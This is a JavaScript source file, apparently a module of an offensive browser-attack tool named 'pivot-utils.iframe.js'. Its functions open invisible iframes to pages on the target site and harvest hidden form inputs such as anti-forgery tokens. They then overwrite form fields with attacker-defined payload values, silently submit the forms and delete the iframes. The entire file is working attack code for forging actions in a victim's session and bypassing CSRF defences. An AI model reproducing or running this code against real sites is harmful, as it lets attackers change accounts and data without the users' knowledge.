
    // ------------------------------- [+] pivot-utils.iframe.js [+] --------------------

    // no async or await to keep compatibility backwards
    /**
    * Function that fetches new hidden inputs of a form
    * @param    {List} payloads    A list of forms to be injected
    */
    function fetchFreshHiddenInputs_and_UpdateValues_and_InjectForms(payload) {
        if (payload) {
            ifrmCheck = document.getElementById(payload.identifier)
            if (ifrmCheck == null) {
                var ifrm = document.createElement("iframe");
                ifrm.setAttribute("id", payload.identifier);
                ifrm.src = payload.origin
                document.body.appendChild(ifrm);

                var func = function () {
                    doc = ifrm.contentDocument || ifrm.contentWindow.document
                    var contentType = doc.contentType || doc.mimeType;
                    if (contentType) {
                        data = doc.body.outerHTML
                        if (typeof data === 'string') {
                            hidden_inputs = getHiddenInputsByForm(data, payload.formNumberInPage)
                            var hidden_inputs_size = Object.keys(hidden_inputs).length;

                            if (hidden_inputs_size > 0) {
                                updated_payload = updateFormHiddenInputs(payload, hidden_inputs)
                            }
                            if (debug)
                                console.log("[*] updateHiddenTypeInputs_technique and CreateTwoPayloadsFromOne_and_InjectThem")
                            CreateTwoPayloadsFromOne_and_InjectThem(payload)
                        }
                    }
                    ifrm.remove()
                };

                if (ifrm.addEventListener)
                    ifrm.addEventListener('load', func, true);
                else if (ifrm.attachEvent)
                    ifrm.attachEvent('onload', func);
            }
        }
    }

    IframeElements = []
    IframeElementsID = 0;
    /**
    * Function that injects the payloads/forms via iframe + DOM manipulation
    * @param    {String} payload    the form to be injected
    */
    function injectForm(payload) {
        newNode = document.createElement("iframe")
        debug = false
        if (debug)
            newNode.style = "width:500px;height:400px"
        else
            newNode.style = "width:0;height:0;border:0; border:none;"

        newNode.id = payload.identifier
        IframeElements.push(newNode)
        newNode.onload = function () {

            if (debug) {
                console.log(IframeElements[IframeElementsID].contentWindow.document.body);
                console.log(IframeElementsID);
                console.log(payload.inputs)
            }

            for (index in payload.inputs) {
                type = payload.inputs[index].Type
                name = payload.inputs[index].name
                value = payload.inputs[index].value
                checked = payload.inputs[index].checked

                if (debug) {
                    console.log(IframeElements[IframeElementsID].id + " : " + type + " - " + name + " - " + value)
                    console.log(IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0])
                }

                if (IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0] !== undefined) {
                    IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].value = value

                    if (IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].type == "checkbox" || IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].type == "radio") {
                        IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].checked = checked
                    }

                    if (payload.inputs[index].Type == "submit") {
                        payload.inputs[index].Type = "hidden"

                    }
                    // submit form and remove it.
                    if (!debug) {
                        IframeElements[IframeElementsID].onload = function () { this.remove() }
                        IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].form.submit()
                    }
                }
            }
            IframeElementsID++;
        }

        newNode.src = payload.origin
        document.body.appendChild(newNode)
    }

    /**
    * Function that creates two versions of forms from a payload/form
    * @param    {String} payload    the form to be injected
    */
    function CreateTwoPayloadsFromOne_and_InjectThem(payload) {
        if (settings) {
            var v1 = {};
            Object.assign(v1, payload);

            var v2 = {};
            Object.assign(v2, payload);

            var TwoPayloads = [v1, v2];
            // original values + overwritten values with settings (Standalone)
            TwoPayloads[0].inputs = craftNewForms(payload.inputs, false)
            //-----------------------------
            TwoPayloads[1].inputs = craftNewForms(payload.inputs, true)

            if (debug)
                console.log(TwoPayloads)

            injectForm(TwoPayloads[0])
            injectForm(TwoPayloads[1])

        }
    }



/*----------------------------------------------------------------------*/

